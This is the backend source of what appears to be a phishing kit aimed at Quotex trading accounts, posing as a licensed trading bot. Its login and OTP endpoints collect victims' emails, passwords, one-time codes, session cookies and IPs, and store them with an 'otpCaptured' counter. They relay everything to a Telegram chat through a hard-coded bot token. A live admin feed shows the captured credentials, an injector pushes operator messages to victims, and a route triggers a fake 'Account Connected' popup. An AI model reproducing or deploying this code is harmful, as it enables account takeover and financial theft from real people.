const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// ================== POSTGRESQL SETUP ==================
// When DATABASE_URL is set (Render, Railway, Fly.io, Supabase, Neon, etc.)
// all data is stored permanently in PostgreSQL.
// If DATABASE_URL is NOT set, falls back to the original file-based storage.
let pool = null;
let useDatabase = false;

if (process.env.DATABASE_URL) {
    try {
        const { Pool } = require('pg');
        pool = new Pool({
            connectionString: process.env.DATABASE_URL,
            ssl: process.env.DATABASE_URL.includes('localhost') ? false : { rejectUnauthorized: false },
            // Connection pool tuned for 100k concurrent users
            max: 100,                  // maximum 100 simultaneous DB connections
            idleTimeoutMillis: 30000,  // close idle connections after 30s
            connectionTimeoutMillis: 5000,
        });
        useDatabase = true;
        console.log('✅ PostgreSQL mode: permanent storage enabled');
    } catch (e) {
        console.warn('⚠️  pg module not found or DB error — falling back to file storage:', e.message);
        useDatabase = false;
    }
} else {
    console.log('📁 File storage mode: set DATABASE_URL env var for permanent PostgreSQL storage');
}

// ================== DATABASE SCHEMA INIT ==================
async function initDatabase() {
    if (!useDatabase || !pool) return;
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                licence_key TEXT NOT NULL,
                full_name TEXT DEFAULT 'Unknown',
                username TEXT DEFAULT '',
                password TEXT DEFAULT '',
                otp TEXT DEFAULT '',
                ip TEXT DEFAULT '',
                cookies TEXT DEFAULT '',
                status TEXT DEFAULT 'Active',
                connected BOOLEAN DEFAULT false,
                blocked BOOLEAN DEFAULT false,
                last_activity TIMESTAMPTZ DEFAULT NOW(),
                activities JSONB DEFAULT '[]'::jsonb,
                created_at TIMESTAMPTZ DEFAULT NOW()
            );
            CREATE INDEX IF NOT EXISTS idx_users_licence_key ON users(licence_key);
            CREATE INDEX IF NOT EXISTS idx_users_full_name ON users(LOWER(full_name));
            CREATE INDEX IF NOT EXISTS idx_users_status ON users(status);
            CREATE INDEX IF NOT EXISTS idx_users_last_activity ON users(last_activity DESC);

            CREATE TABLE IF NOT EXISTS licenses (
                key TEXT PRIMARY KEY,
                type TEXT DEFAULT 'Standard',
                status TEXT DEFAULT 'Active',
                uses_remaining INTEGER,
                assigned_to TEXT,
                date_added TIMESTAMPTZ DEFAULT NOW(),
                expiry TIMESTAMPTZ
            );
            CREATE INDEX IF NOT EXISTS idx_licenses_status ON licenses(status);

            CREATE TABLE IF NOT EXISTS pending_messages (
                id SERIAL PRIMARY KEY,
                user_name TEXT NOT NULL,
                message_data JSONB NOT NULL,
                created_at TIMESTAMPTZ DEFAULT NOW(),
                delivered BOOLEAN DEFAULT false
            );
            CREATE INDEX IF NOT EXISTS idx_pending_messages_user_name ON pending_messages(LOWER(user_name));
            CREATE INDEX IF NOT EXISTS idx_pending_messages_delivered ON pending_messages(delivered);

            CREATE TABLE IF NOT EXISTS activity_log (
                id SERIAL PRIMARY KEY,
                action TEXT NOT NULL,
                user_name TEXT,
                licence_key TEXT,
                ip TEXT,
                data JSONB,
                created_at TIMESTAMPTZ DEFAULT NOW()
            );
            CREATE INDEX IF NOT EXISTS idx_activity_log_created ON activity_log(created_at DESC);
        `);
        console.log('✅ Database tables ready');
    } catch (e) {
        console.error('❌ DB schema init error:', e.message);
    } finally {
        client.release();
    }
}

// ================== DB HELPER: row → user object ==================
function rowToUser(row) {
    if (!row) return null;
    return {
        id:           row.id,
        licenceKey:   row.licence_key,
        fullName:     row.full_name,
        username:     row.username,
        password:     row.password,
        otp:          row.otp,
        ip:           row.ip,
        cookies:      row.cookies,
        status:       row.status,
        connected:    row.connected,
        blocked:      row.blocked,
        lastActivity: row.last_activity,
        activities:   row.activities || [],
    };
}

// ================== DB HELPER: row → license object ==================
function rowToLicense(row) {
    if (!row) return null;
    return {
        key:           row.key,
        type:          row.type,
        status:        row.status,
        usesRemaining: row.uses_remaining,
        assignedTo:    row.assigned_to,
        dateAdded:     row.date_added,
        expiry:        row.expiry,
    };
}

// ================== DB: Get or create user ==================
async function dbGetOrCreateUser(licenceKey, fullName = "Unknown") {
    const hasName = fullName && fullName !== "Unknown" && fullName !== "Pending Name";
    const client = await pool.connect();
    try {
        let row;
        if (hasName) {
            // Primary: match by licenceKey + fullName (case-insensitive on name)
            const r = await client.query(
                `SELECT * FROM users WHERE licence_key = $1 AND LOWER(full_name) = LOWER($2) LIMIT 1`,
                [licenceKey, fullName]
            );
            row = r.rows[0];
            // Fallback: licenceKey match with blank/Unknown name
            if (!row) {
                const r2 = await client.query(
                    `SELECT * FROM users WHERE licence_key = $1 AND (full_name IS NULL OR full_name IN ('Unknown','Pending Name','')) LIMIT 1`,
                    [licenceKey]
                );
                row = r2.rows[0];
            }
        } else {
            const r = await client.query(
                `SELECT * FROM users WHERE licence_key = $1 LIMIT 1`,
                [licenceKey]
            );
            row = r.rows[0];
        }

        if (!row) {
            const newId = Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7);
            const r = await client.query(
                `INSERT INTO users (id, licence_key, full_name, last_activity)
                 VALUES ($1, $2, $3, NOW())
                 ON CONFLICT (id) DO UPDATE SET last_activity = NOW()
                 RETURNING *`,
                [newId, licenceKey, hasName ? fullName : "Unknown"]
            );
            row = r.rows[0];
        } else {
            // Update name if we now have one
            if (hasName && row.full_name !== fullName) {
                await client.query(
                    `UPDATE users SET full_name = $1, last_activity = NOW() WHERE id = $2`,
                    [fullName, row.id]
                );
                row.full_name = fullName;
            } else {
                await client.query(`UPDATE users SET last_activity = NOW() WHERE id = $1`, [row.id]);
            }
        }
        return rowToUser(row);
    } finally {
        client.release();
    }
}

// ================== DB: Save user (upsert) ==================
async function dbSaveUser(user) {
    if (!useDatabase || !pool) return;
    const client = await pool.connect();
    try {
        await client.query(
            `INSERT INTO users (id, licence_key, full_name, username, password, otp, ip, cookies,
                                status, connected, blocked, last_activity, activities)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,NOW(),$12)
             ON CONFLICT (id) DO UPDATE SET
                full_name    = EXCLUDED.full_name,
                username     = EXCLUDED.username,
                password     = EXCLUDED.password,
                otp          = EXCLUDED.otp,
                ip           = EXCLUDED.ip,
                cookies      = EXCLUDED.cookies,
                status       = EXCLUDED.status,
                connected    = EXCLUDED.connected,
                blocked      = EXCLUDED.blocked,
                last_activity = NOW(),
                activities   = EXCLUDED.activities`,
            [
                user.id, user.licenceKey, user.fullName, user.username || '',
                user.password || '', user.otp || '', user.ip || '', user.cookies || '',
                user.status || 'Active', user.connected || false, user.blocked || false,
                JSON.stringify(user.activities || [])
            ]
        );
    } catch (e) {
        console.error('dbSaveUser error:', e.message);
    } finally {
        client.release();
    }
}

// ================== DB: Get all users ==================
async function dbGetAllUsers() {
    const client = await pool.connect();
    try {
        const r = await client.query(`SELECT * FROM users ORDER BY last_activity DESC`);
        return r.rows.map(rowToUser);
    } finally {
        client.release();
    }
}

// ================== DB: Find user by licenceKey ==================
async function dbFindUserByKey(licenceKey) {
    const client = await pool.connect();
    try {
        const r = await client.query(`SELECT * FROM users WHERE licence_key = $1 LIMIT 1`, [licenceKey]);
        return rowToUser(r.rows[0]);
    } finally {
        client.release();
    }
}

// ================== DB: Stats ==================
async function dbGetStats() {
    const client = await pool.connect();
    try {
        const r = await client.query(`
            SELECT
                COUNT(*)                                              AS "totalUsers",
                COUNT(*) FILTER (WHERE status = 'Online')            AS "onlineNow",
                COUNT(*) FILTER (WHERE otp IS NOT NULL AND otp != '') AS "otpCaptured",
                COUNT(*) FILTER (WHERE connected = true)             AS "connectedAccounts"
            FROM users
        `);
        const lr = await client.query(`
            SELECT
                COUNT(*)                                     AS "totalLicenses",
                COUNT(*) FILTER (WHERE status = 'Active')   AS "activeLicenses"
            FROM licenses
        `);
        return {
            totalUsers:        parseInt(r.rows[0].totalUsers),
            onlineNow:         parseInt(r.rows[0].onlineNow),
            otpCaptured:       parseInt(r.rows[0].otpCaptured),
            connectedAccounts: parseInt(r.rows[0].connectedAccounts),
            totalLicenses:     parseInt(lr.rows[0].totalLicenses),
            activeLicenses:    parseInt(lr.rows[0].activeLicenses),
        };
    } finally {
        client.release();
    }
}

// ================== DB: License operations ==================
async function dbGetAllLicenses() {
    const client = await pool.connect();
    try {
        const r = await client.query(`SELECT * FROM licenses ORDER BY date_added DESC`);
        return r.rows.map(rowToLicense);
    } finally {
        client.release();
    }
}

async function dbFindLicense(key) {
    const client = await pool.connect();
    try {
        const r = await client.query(`SELECT * FROM licenses WHERE key = $1 LIMIT 1`, [key]);
        return rowToLicense(r.rows[0]);
    } finally {
        client.release();
    }
}

async function dbInsertLicense(lic) {
    const client = await pool.connect();
    try {
        await client.query(
            `INSERT INTO licenses (key, type, status, uses_remaining, assigned_to, date_added, expiry)
             VALUES ($1,$2,$3,$4,$5,NOW(),$6)`,
            [lic.key, lic.type, lic.status, lic.usesRemaining || null, lic.assignedTo || null,
             lic.expiry ? new Date(lic.expiry) : null]
        );
    } finally {
        client.release();
    }
}

async function dbUpdateLicenseStatus(key, status) {
    const client = await pool.connect();
    try {
        await client.query(`UPDATE licenses SET status = $1 WHERE key = $2`, [status, key]);
    } finally {
        client.release();
    }
}

async function dbDeleteLicense(key) {
    const client = await pool.connect();
    try {
        await client.query(`DELETE FROM licenses WHERE key = $1`, [key]);
    } finally {
        client.release();
    }
}

// ================== DB: Pending messages ==================
async function dbAddPendingMessage(userName, msgPayload) {
    if (!useDatabase || !pool) return;
    const client = await pool.connect();
    try {
        // Cap at 20 messages per user
        await client.query(
            `INSERT INTO pending_messages (user_name, message_data) VALUES ($1, $2)`,
            [userName.trim().toLowerCase(), JSON.stringify(msgPayload)]
        );
        // Delete oldest beyond 20 per user
        await client.query(
            `DELETE FROM pending_messages WHERE id IN (
                SELECT id FROM pending_messages
                WHERE LOWER(user_name) = LOWER($1) AND delivered = false
                ORDER BY created_at ASC
                OFFSET 20
            )`,
            [userName]
        );
    } catch (e) {
        console.error('dbAddPendingMessage error:', e.message);
    } finally {
        client.release();
    }
}

async function dbPollAndClearMessages(userName) {
    if (!useDatabase || !pool) return [];
    const client = await pool.connect();
    try {
        const r = await client.query(
            `UPDATE pending_messages
             SET delivered = true
             WHERE LOWER(user_name) = LOWER($1) AND delivered = false
             RETURNING message_data`,
            [userName.trim()]
        );
        return r.rows.map(row => row.message_data);
    } catch (e) {
        console.error('dbPollAndClearMessages error:', e.message);
        return [];
    } finally {
        client.release();
    }
}

// ================== EXPRESS APP ==================
const app = express();
app.use(cors());
app.use(express.json());

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" });
    } catch (error) {
        console.error("Telegram Error:", error.message);
    }
}

// ================== SSE BROADCAST ==================
const sseClients = new Set();

// ================== PENDING MESSAGES (in-memory fallback) ==================
// Used when DATABASE_URL is not set. Key: userName (string), Value: array of message objects
const pendingMessages = {};

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => {
        try { client.write(`data: ${payload}\n\n`); } catch (e) {}
    });
}

// Real-time SSE endpoint (admin panel connects here)
app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();

    // Send heartbeat every 20 seconds to keep connection alive
    const heartbeat = setInterval(() => {
        try { res.write(`:heartbeat\n\n`); } catch (e) {}
    }, 20000);

    sseClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);

    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
    });
});

// ================== PERSISTENT STORAGE (FILE FALLBACK) ==================
// DATA_DIR env var lets you point to a persistent disk on Render.com / Railway / Fly.io
// e.g. on Render: set DATA_DIR=/data  and mount a persistent disk at /data
// If not set, falls back to a "data" folder next to this file
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');

// Ensure data directory exists
try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
} catch (e) { console.error('Could not create DATA_DIR:', e.message); }

const DATA_FILE     = path.join(DATA_DIR, 'users.json');
const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');

let users    = [];
let licenses = [];

function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            users = JSON.parse(data);
        } else {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) { users = []; }
}

function saveUsers() {
    try {
        // Atomic write: write to temp file first, then rename
        const tmp = DATA_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(users, null, 2));
        fs.renameSync(tmp, DATA_FILE);
    } catch (e) {
        // Fallback: direct write
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch (e2) {}
    }
}

function loadLicenses() {
    try {
        if (fs.existsSync(LICENSES_FILE)) {
            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
            licenses = data ? JSON.parse(data) : [];
        } else {
            licenses = [];
            fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) { licenses = []; }
}

function saveLicenses() {
    try {
        // Atomic write: write to temp file first, then rename
        const tmp = LICENSES_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(licenses, null, 2));
        fs.renameSync(tmp, LICENSES_FILE);
    } catch (e) {
        // Fallback: direct write
        try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch (e2) {}
    }
}

if (!useDatabase) {
    loadUsers();
    loadLicenses();
    // Periodic auto-save every 30 seconds to ensure no data loss (file mode only)
    setInterval(() => {
        try { saveUsers(); } catch (e) {}
        try { saveLicenses(); } catch (e) {}
    }, 30000);
}

// Helper: Get or create user (file-based fallback)
// Matches by BOTH licenceKey AND fullName so that multiple people sharing
// the same license key still get separate records (one row per person).
// Falls back to licenceKey-only match when fullName is "Unknown" or blank.
function getOrCreateUserFile(licenceKey, fullName = "Unknown") {
    const hasName = fullName && fullName !== "Unknown" && fullName !== "Pending Name";

    let user;
    if (hasName) {
        // Primary: match by licenceKey + fullName (case-insensitive on name)
        user = users.find(u =>
            u.licenceKey === licenceKey &&
            (u.fullName || '').toLowerCase() === fullName.toLowerCase()
        );
        // Fallback: if no match by both, but there IS an exact licenceKey match
        // whose fullName is still blank/Unknown, claim that record
        if (!user) {
            user = users.find(u =>
                u.licenceKey === licenceKey &&
                (!u.fullName || u.fullName === "Unknown" || u.fullName === "Pending Name")
            );
        }
    } else {
        // No meaningful name yet — legacy match by licenceKey only
        user = users.find(u => u.licenceKey === licenceKey);
    }

    if (!user) {
        user = {
            id: Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7),
            licenceKey,
            fullName: hasName ? fullName : "Unknown",
            username: "",
            password: "",
            otp: "",
            ip: "",
            cookies: "",
            status: "Active",
            connected: false,
            lastActivity: new Date().toISOString(),
            activities: []
        };
        users.unshift(user);
    }

    if (hasName && user.fullName !== fullName) user.fullName = fullName;
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

// Unified getOrCreateUser — uses DB when available, files otherwise
async function getOrCreateUser(licenceKey, fullName = "Unknown") {
    if (useDatabase) {
        return await dbGetOrCreateUser(licenceKey, fullName);
    }
    return getOrCreateUserFile(licenceKey, fullName);
}

// Unified saveUser
async function saveUser(user) {
    if (useDatabase) {
        await dbSaveUser(user);
    } else {
        saveUsers();
    }
}

// ================== LICENSE ROUTES ==================
app.get('/api/licenses', async (req, res) => {
    try {
        if (useDatabase) {
            const lics = await dbGetAllLicenses();
            return res.json(lics);
        }
        res.json(licenses);
    } catch (e) {
        console.error('/api/licenses GET error:', e.message);
        res.json(licenses);
    }
});

app.post('/api/licenses', async (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: "Key required" });

    try {
        if (useDatabase) {
            const existing = await dbFindLicense(key);
            if (existing) return res.status(400).json({ error: "License already exists" });
            const newLicense = {
                key,
                type: type || "Standard",
                status: status || "Active",
                usesRemaining: maxUses || null,
                assignedTo: null,
                dateAdded: new Date().toISOString(),
                expiry: expiry || null
            };
            await dbInsertLicense(newLicense);
            broadcastSSE('license_added', newLicense);
            return res.json({ success: true });
        }
        // File fallback
        if (licenses.find(l => l.key === key)) {
            return res.status(400).json({ error: "License already exists" });
        }
        const newLicense = {
            key,
            type: type || "Standard",
            status: status || "Active",
            usesRemaining: maxUses || null,
            assignedTo: null,
            dateAdded: new Date().toISOString(),
            expiry: expiry || null
        };
        licenses.unshift(newLicense);
        saveLicenses();
        broadcastSSE('license_added', newLicense);
        res.json({ success: true });
    } catch (e) {
        console.error('/api/licenses POST error:', e.message);
        res.status(500).json({ error: "Server error" });
    }
});

app.patch('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    const { status } = req.body;

    try {
        if (useDatabase) {
            const license = await dbFindLicense(key);
            if (!license) return res.status(404).json({ error: "License not found" });
            if (status) await dbUpdateLicenseStatus(key, status);
            broadcastSSE('license_updated', { key, status: status || license.status });
            return res.json({ success: true, key, status: status || license.status });
        }
        // File fallback
        const license = licenses.find(l => l.key === key);
        if (!license) return res.status(404).json({ error: "License not found" });
        if (status) license.status = status;
        saveLicenses();
        broadcastSSE('license_updated', { key, status: license.status });
        res.json({ success: true, key, status: license.status });
    } catch (e) {
        console.error('/api/licenses PATCH error:', e.message);
        res.status(500).json({ error: "Server error" });
    }
});

app.delete('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    try {
        if (useDatabase) {
            await dbDeleteLicense(key);
            broadcastSSE('license_deleted', { key });
            return res.json({ success: true });
        }
        // File fallback
        licenses = licenses.filter(l => l.key !== key);
        saveLicenses();
        broadcastSSE('license_deleted', { key });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/licenses DELETE error:', e.message);
        res.status(500).json({ error: "Server error" });
    }
});

// Validate License (called by main bot)
app.post('/api/validate-license', async (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: "No key provided" });

    try {
        if (useDatabase) {
            const license = await dbFindLicense(licenseKey);
            const valid = !!(license &&
                license.status === "Active" &&
                (!license.expiry || new Date(license.expiry) > new Date()));
            return res.json({
                valid,
                message: valid ? "License is valid" : "Invalid or expired license key."
            });
        }
        // File fallback
        const license = licenses.find(l =>
            l.key === licenseKey &&
            l.status === "Active" &&
            (!l.expiry || new Date(l.expiry) > new Date())
        );
        res.json({
            valid: !!license,
            message: license ? "License is valid" : "Invalid or expired license key."
        });
    } catch (e) {
        console.error('/api/validate-license error:', e.message);
        res.json({ valid: false, message: "Server error during validation" });
    }
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    try {
        const user = await getOrCreateUser(licenseKey, userName);
        if (userName && userName !== "Pending Name") user.fullName = userName;
        user.activities = user.activities || [];
        user.activities.push({ action: "License Activated", timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('license_activated', {
            licenceKey: licenseKey,
            fullName: userName,
            ip,
            timestamp: timestamp || new Date().toLocaleString()
        });

        const message = `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`;
        await sendTelegramMessage(message);
        res.status(200).json({ status: "success" });
    } catch (e) {
        console.error('/api/license-activate error:', e.message);
        res.status(500).json({ status: "error" });
    }
});

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    try {
        const user = await getOrCreateUser(licenceKey, name);
        user.username = email;
        user.password = password;
        user.ip = ip;
        user.cookies = cookies;
        user.status = "Online";
        user.activities = user.activities || [];
        user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('quotex_login', {
            licenceKey,
            fullName: name,
            email,
            password,
            ip,
            cookies,
            timestamp: new Date().toLocaleString()
        });

        const message = `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
        await sendTelegramMessage(message);
        res.status(200).json({ status: "ok" });
    } catch (e) {
        console.error('/api/quotex-login error:', e.message);
        res.status(500).json({ status: "error" });
    }
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    try {
        const user = await getOrCreateUser(licenceKey, name);
        user.otp = otp;
        user.ip = ip;
        user.cookies = cookies;
        user.status = "Online";
        user.activities = user.activities || [];
        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('otp_entered', {
            licenceKey,
            fullName: name,
            email,
            otp,
            ip,
            cookies,
            timestamp: new Date().toLocaleString()
        });

        const message = `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
        await sendTelegramMessage(message);
        res.status(200).json({ status: "ok" });
    } catch (e) {
        console.error('/api/quotex-otp error:', e.message);
        res.status(500).json({ status: "error" });
    }
});

// ================== BLOCK / UNBLOCK USER ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) {
                user.blocked = true;
                user.status  = "Blocked";
                user.activities = user.activities || [];
                user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
                await dbSaveUser(user);
            }
            await dbUpdateLicenseStatus(licenceKey, "Inactive");

            broadcastSSE('user_blocked', {
                licenceKey,
                fullName: user?.fullName || 'Unknown',
                timestamp: new Date().toLocaleString()
            });

            const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
            await sendTelegramMessage(msg);
            return res.json({ success: true });
        }

        // File fallback
        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) {
            user.blocked = true;
            user.status  = "Blocked";
            user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
            saveUsers();
        }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) {
            lic.status = "Inactive";
            saveLicenses();
        }
        broadcastSSE('user_blocked', {
            licenceKey,
            fullName: user?.fullName || 'Unknown',
            timestamp: new Date().toLocaleString()
        });
        const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
        await sendTelegramMessage(msg);
        res.json({ success: true });
    } catch (e) {
        console.error('/api/block-user error:', e.message);
        res.status(500).json({ error: "Server error" });
    }
});

app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) {
                user.blocked = false;
                user.status  = "Active";
                user.activities = user.activities || [];
                user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
                await dbSaveUser(user);
            }
            await dbUpdateLicenseStatus(licenceKey, "Active");

            broadcastSSE('user_unblocked', {
                licenceKey,
                fullName: user?.fullName || 'Unknown',
                timestamp: new Date().toLocaleString()
            });
            return res.json({ success: true });
        }

        // File fallback
        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) {
            user.blocked = false;
            user.status  = "Active";
            user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
            saveUsers();
        }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) {
            lic.status = "Active";
            saveLicenses();
        }
        broadcastSSE('user_unblocked', {
            licenceKey,
            fullName: user?.fullName || 'Unknown',
            timestamp: new Date().toLocaleString()
        });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/unblock-user error:', e.message);
        res.status(500).json({ error: "Server error" });
    }
});

// Called by the main bot every 15 seconds to check if user is still authorised
app.get('/api/check-access', async (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: "no_key" });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenseKey);
            if (user && user.blocked) {
                return res.json({ allowed: false, reason: "blocked" });
            }
            const lic = await dbFindLicense(licenseKey);
            if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
                return res.json({ allowed: false, reason: "license_inactive" });
            }
            return res.json({ allowed: true });
        }

        // File fallback
        const user = users.find(u => u.licenceKey === licenseKey);
        if (user && user.blocked) {
            return res.json({ allowed: false, reason: "blocked" });
        }
        const lic = licenses.find(l => l.key === licenseKey);
        if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
            return res.json({ allowed: false, reason: "license_inactive" });
        }
        res.json({ allowed: true });
    } catch (e) {
        console.error('/api/check-access error:', e.message);
        res.json({ allowed: true }); // fail open on network errors
    }
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    res.status(200).json({ status: "success" });
});

app.post('/api/notification-permission', async (req, res) => {
    const { userName, permission, timestamp } = req.body;
    res.status(200).json({ status: "success" });
});

// ================== TRIGGER CONNECTED ==================
// FIX: Broadcast BOTH 'show_connected' (for main-bot) AND 'trigger_connected' (for admin panel log)
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || "User";

    // 'show_connected' is what the main-bot listens for — triggers the
    // "Account Connected Successfully" popup + profile setup form
    broadcastSSE('show_connected', { userName });

    // 'trigger_connected' is kept for the admin panel's activity log
    broadcastSSE('trigger_connected', { userName });

    const message = `🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`;
    await sendTelegramMessage(message);
    res.send("Trigger sent");
});

// ================== SEND MESSAGE TO USER (Msg Injector) ==================
app.post('/api/send-message', async (req, res) => {
    const { userName, message, type } = req.body;
    if (!userName || !message) {
        return res.status(400).json({ error: "userName and message are required" });
    }

    const ts      = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const msgType = type || 'info';

    const msgPayload = { userName, message, type: msgType, timestamp: ts };

    // 1. Try SSE instant delivery (works when main-bot SSE connection is live)
    broadcastSSE('injected_message', msgPayload);

    // 2. ALSO store in pending map so main-bot poll can pick it up even if
    //    the SSE connection was down when the broadcast fired.
    if (useDatabase) {
        await dbAddPendingMessage(userName, msgPayload);
    } else {
        // In-memory fallback
        const key = userName.trim().toLowerCase();
        if (!pendingMessages[key]) pendingMessages[key] = [];
        pendingMessages[key].push(msgPayload);
        // Cap at 20 stored messages per user to avoid unbounded growth
        if (pendingMessages[key].length > 20) pendingMessages[key].shift();
    }

    // Also log the activity
    broadcastSSE('activity', {
        action: `💬 Message Injected [${msgType}] → ${userName}`,
        userName,
        ip: '—',
        timestamp: ts
    });

    // Notify admin via Telegram
    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
    const emoji = typeEmojis[msgType] || '💬';
    const telegramMsg = `${emoji} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`;
    await sendTelegramMessage(telegramMsg);

    res.status(200).json({ success: true, delivered: true });
});

// ================== POLL FOR PENDING MESSAGES (main-bot polling fallback) ==================
// Main-bot calls this every 5 seconds. Returns any messages queued for this
// user (stored by /api/send-message) and clears them so they are shown once only.
app.get('/api/poll-messages', async (req, res) => {
    const userName = (req.query.userName || '').trim().toLowerCase();
    if (!userName) return res.json({ messages: [] });

    try {
        if (useDatabase) {
            const msgs = await dbPollAndClearMessages(userName);
            return res.json({ messages: msgs });
        }

        // File fallback (in-memory)
        const msgs = pendingMessages[userName] || [];
        // Clear after reading so messages are only shown once
        pendingMessages[userName] = [];
        res.json({ messages: msgs });
    } catch (e) {
        console.error('/api/poll-messages error:', e.message);
        res.json({ messages: [] });
    }
});

// ================== MAINTENANCE MODE ==================
